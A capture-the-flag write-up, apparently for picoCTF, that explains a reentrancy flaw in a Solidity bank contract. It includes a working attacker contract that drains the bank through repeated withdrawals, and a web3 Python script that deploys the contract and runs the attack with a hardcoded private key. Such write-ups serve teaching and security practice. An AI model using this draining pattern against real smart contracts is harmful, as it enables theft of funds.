Theory

According to the description, to get the flag we'll need to drain the bank's balance to being broke at 0 money so that the flag can get revealed. The developer claims that it's absolutely impossible to withdraw more than we own, so that's exactly what we're going to try to break just to prove him wrong. So for that, we'll have to skip to the solution part to look at the contract and the details webpage we are given.

Solution

So looking at the contract everything looks almost fine, because yes, you can't withdraw more than you deposited, there's a check for that, but look at the rest of the function:

function withdraw(uint amount) public {
  require(balances[msg.sender] >= amount, "Insufficient funds available");

  (bool sent, ) = msg.sender.call{value: amount}("");
  balances[msg.sender] -= amount;

  require(sent, "Transfer failed");

  if (!revealed && address(this).balance == 0) {
    revealed = true;
    emit FlagRevealed(flag);
  }
}

So there's the exploit, basically the contract first sends Ethereum to msg.sender, then it updates the balance AFTER that transaction, so it's backwards. Because when Ethereum is sent using .call, it can trigger code in the receiver (only if it's a contract), so that means we can re-enter the withdraw function before our balance is lowered back down. Okay, now that we have that, we'll do first our own contract. We'll use this for the looping robber exploit by first, putting a little money into the bank, starting a withdrawal, then exploiting reentrancy to withdraw repeatedly until the bank is completely drained before its balance updates:

pragma solidity ^0.6.12;

interface IVulnBank {
  function deposit() external payable;
  function withdraw(uint amount) external;
}

contract NewContract {
  IVulnBank public bank;
  uint256 public attackAmount = 1 ether;

  constructor(address _bank) public {
    bank = IVulnBank(_bank);
  }

  function startHeist() external payable {
    require(msg.value >= attackAmount, "Need ETH");
    bank.deposit{value: attackAmount}();
    bank.withdraw(attackAmount);
  }

  receive() external payable {
    uint bankRemaining = address(bank).balance;
    if (bankRemaining > 0) {
      uint amountToTake = attackAmount;
      if (bankRemaining < attackAmount) {
        amountToTake = bankRemaining;
      }
      bank.withdraw(amountToTake);
    }
  }
}

Perfect, we have everything we need now. To create the exploit code, all we need to do now is initialize Web3 to see that we can connect, then enter our credentials and import the new contract exploit we created. Then we do a first transaction that deploys the contract, which does startHeist() so that it does the looped robbing attack, and finally when the bank's balance hits 0 we print the flag:

from web3 import Web3
from solcx import compile_source, install_solc

w3 = Web3(Web3.HTTPProvider("http://crystal-peak.picoctf.net:52058"))
print("is connec:", w3.is_connected())

addr = "0xD3b5be163C2Df0dEa3e7f46a917918E6Ac6D23Ef"
privkey = "0x4bbb6b1043ca3aff4e3c6bf76089f4b20056a028c3780105962f977395abce37"
bandkress = "0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF"

with open("New.sol", "r") as f: source = f.read()
install_solc("0.6.12")
cix = compile_source(source, solc_version="0.6.12")["<stdin>:NewContract"]
ABI = cix["abi"]
bytecode = cix["bin"]

print("\ndeploy our contract")
NewContract = w3.eth.contract(abi=ABI, bytecode=bytecode)
non = w3.eth.get_transaction_count(addr)
deploytx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(NewContract.constructor(bandkress).build_transaction({"chainId":w3.eth.chain_id,"gas":3000000,"gasPrice":w3.eth.gas_price,"nonce":non}),private_key=privkey).raw_transaction)
print(deploytx_hash.hex())
tx_receipt = w3.eth.wait_for_transaction_receipt(deploytx_hash)
attadd = tx_receipt.contractAddress
print(attadd)
print("\nexeCUTE startHeist()")
contract = w3.eth.contract(address=attadd, abi=ABI)
non = w3.eth.get_transaction_count(addr)
attacktx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(contract.functions.startHeist().build_transaction({"chainId":w3.eth.chain_id,"gas":5000000,"gasPrice":w3.eth.gas_price,"nonce":non,"value":w3.to_wei(1,"ether")}),private_key=privkey).raw_transaction)
print(attacktx_hash.hex())
print("\nwait to be mined")
w3.eth.wait_for_transaction_receipt(attacktx_hash)
final = w3.eth.get_balance(bandkress)
print("result bank balance:", final)

if final != 0:
  print("bank no drain")
print(w3.eth.contract(address=Web3.to_checksum_address(bandkress), abi=[{"name":"getFlag","type":"function","stateMutability":"view","inputs":[],"outputs":[{"type": "string"}]}]).functions.getFlag().call())
